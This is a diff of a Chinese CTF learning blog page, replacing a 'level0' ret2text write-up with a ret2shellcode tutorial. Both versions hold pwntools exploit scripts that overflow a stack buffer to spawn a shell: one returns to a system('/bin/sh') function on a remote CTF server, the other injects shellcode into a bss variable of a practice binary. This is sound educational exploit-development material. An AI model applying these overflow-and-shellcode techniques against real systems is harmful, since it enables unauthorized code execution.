@@ -157,7 +157,7 @@
                     <article class="post-wrap">
                         <header class="post-header">
                             <h1 class="post-title">
-                                [攻防世界]PWN-level0
+                                [PWN]ret2shellcode学习笔记
                             </h1>
                             
                                 <!--en-->
@@ -167,12 +167,12 @@
                                         「配枪朱丽叶 - 分部。」
                                     </a>
                                     <span class="post-time">
-                                Date: <a href="#">2021-06-28</a>
+                                Date: <a href="#">2021-07-04</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">0.9
+                                    href="#">2.2
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">200</a></span>
+                                    <span class="post-words">words:<a href="#">525</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -186,44 +186,62 @@
                         </header>
                         
                         <div class="post-content">
-                            <p>checksec查看一下信息，发现其开启了NX保护。</p>
-<pre><code>Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
+                            <p>跟着天正师傅博客学的： <a href="http://blog.tianzheng.cool/wp-content/uploads/2020/10/ret2sc.zip">例题附件下载</a><br>
+checksec，这次是32位的：</p>
+<pre><code>[*] '/home/shawroot/Desktop/ret2sc'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x8048000)
+    RWX:      Has RWX segments
 </code></pre>
-<p>使用IDA打开，main中只有这几行代码：</p>
+<p>main函数内容如下：</p>
 <pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  write(1, &quot;Hello, World\n&quot;, 0xDuLL);
-  return vulnerable_function(1LL, &quot;Hello, World\n&quot;);
-}
-</code></pre>
-<p>双击<code>vulnerable_function()</code>函数，看到如下代码：</p>
-<pre><code class="language-c">ssize_t vulnerable_function()
-{
-  char buf; // [rsp+0h] [rbp-80h]
+  char s; // [esp+1Ch] [ebp-14h]
 
-  return read(0, &amp;buf, 0x200uLL);
+  setvbuf(stdout, 0, 2, 0);
+  printf(&quot;Name:&quot;);
+  read(0, &amp;name, 0x32u);
+  printf(&quot;Try your best:&quot;);
+  return (int)gets(&amp;s);
 }
 </code></pre>
-<p>这里的rbp是栈基地址寄存器，保存的是当前的栈底地址为0x80，但是可输入的大小为0x200。<br>
-双击<code>&amp;buf</code>看到返回地址：<br>
-<img src="https://imgpp.com/images/2021/06/28/2021-06-28_171430.png" alt="2021-06-28_171430.png" loading="lazy"></p>
-<p>返回地址可以覆盖成<code>callsystem()</code>，地址为0x400596，可命令执行：</p>
-<pre><code class="language-c">int callsystem()
-{
-  return system(&quot;/bin/sh&quot;);
-}
+<p>有两处输入的地方，分别用了<code>read()</code>和<code>gets()</code>函数去实现。<code>name</code>变量长度足够，不存在栈溢出，<code>gets()</code>函数未限制输入的长度，存在栈溢出。<br>
+但是这道题没有back♂door了，不能用之前学的ret2text去利用，必须自己再写一个shellcode进去。<br>
+写接下来的内容之前，需要了解bss段：</p>
+<blockquote>
+<p>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配。</p>
+</blockquote>
+<p>可以使用<code>readelf</code>命令查看bss段的地址：</p>
+<pre><code>readelf  -S filename
 </code></pre>
-<p>最终脚本如下：</p>
+<p><img src="https://imgpp.com/images/2021/07/04/2021-07-04_170059.png" alt="2021-07-04_170059.png" loading="lazy"><br>
+能看到bss的地址为<code>0x0804a040</code>。<br>
+接下来将程序导入gdb并运行，ctrl+c将程序中断，利用vmmap查看地址段权限，必须保证bss段有可执行权限，shellcode才能运行。</p>
+<pre><code>$ gdb ret2sc
+gdb-peda$ r
+# ctrl + c
+gdb-peda$ vmmap
+</code></pre>
+<p><img src="https://imgpp.com/images/2021/07/04/2021-07-04_170559.png" alt="2021-07-04_170559.png" loading="lazy"><br>
+bss段地址0x0804a040在范围0x0804a000到0x0804b000之间，它是可读可写的，<code>name</code>变量也在bss段中，地址为<code>0x0804A060</code>可以把shellcode写进<code>name</code>变量里，让<code>gets()</code>函数的那里的返回地址溢出到<code>name</code>变量所在的地方。<br>
+找寻溢出偏移。首先打开另一个终端，输入<code>gdb</code>后，使用<code>pattern create 100</code>命令生成一个100长度的字符串。<br>
+<img src="https://imgpp.com/images/2021/07/04/2021-07-04_172232.png" alt="2021-07-04_172232.png" loading="lazy"><br>
+再使用gdb调试题目，按下r键。因为<code>name</code>处不存在溢出，在“Try your best:”下面把这串字符串粘进去，得到程序被中断的警告，程序的返回地址（0x41412941）被输入的字符串覆盖了。再使用<code>pattern offset 0x41412941</code>命令计算偏移量，得到32。<br>
+<img src="https://imgpp.com/images/2021/07/04/2021-07-04_172529.png" alt="2021-07-04_172529.png" loading="lazy"><br>
+至此，可以编写exp了：</p>
 <pre><code class="language-python">from pwn import *
+  
+io = process('./ret2sc')
 
-p = remote('111.200.241.244',63770)
-payload = 'a'*0x80+'a'*0x8+p64(0x500596)
-p.sendline(payload)
-p.interactive()
+shellcode = asm(shellcraft.sh())
+name_addr = 0x0804A060
+payload = 'a'*32+p32(name_addr)
+io.sendlineafter('Name:',shellcode) 
+io.sendlineafter('best:',payload)
+io.interactive()
 </code></pre>
 
                         </div>
@@ -239,7 +257,7 @@ p.interactive()
 
                                             <p class="copyright-item">
                                                 <span>Permalink:</span>
-                                                <span><a href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/</a></span>
+                                                <span><a href="https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/">https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/</a></span>
                                             </p>
 
                                             <p class="copyright-item">
@@ -254,9 +272,9 @@ p.interactive()
                                                         <span style="margin-right:15px">
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
-                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/&sharesource=qzone&title=[攻防世界]PWN-level0&pics=https://shawr00t.github.io/images/avatar.png?v=1625394247302&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/&sharesource=weibo&title=[攻防世界]PWN-level0 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625394247302 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/&sharesource=qzone&title=[PWN]ret2shellcode学习笔记&pics=https://shawr00t.github.io/images/avatar.png?v=1625394247302&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/pwnret2shellcode-xue-xi-bi-ji/&sharesource=weibo&title=[PWN]ret2shellcode学习笔记 + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625394247302 "><i class="fa fa-weibo "></i></a>
                                                         
                                                             <div class="reward ">
                                                                 <div class="reward-button ">&yen;
@@ -291,13 +309,13 @@ p.interactive()
                                                                                 <!---->
                                                                                 <section class="post-nav">
                                                                                     
-                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/bugkuoverflowpwn/">
-                                                                                            [BugKu]overflowPWN
+                                                                                        <a class="prev" rel="prev" href="https://shawr00t.github.io/ctfhubret2shellcode/">
+                                                                                            [CTFhub]ret2shellcode
                                                                                         </a>
                                                                                         
                                                                                             
-                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">
-                                                                                                    [攻防世界]hello_pwn
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/pwntoolsxue-xi-bi-ji/">
+                                                                                                    [Pwntools]学习笔记
                                                                                                 </a>
                                                                                                 
                                                                                 </section>
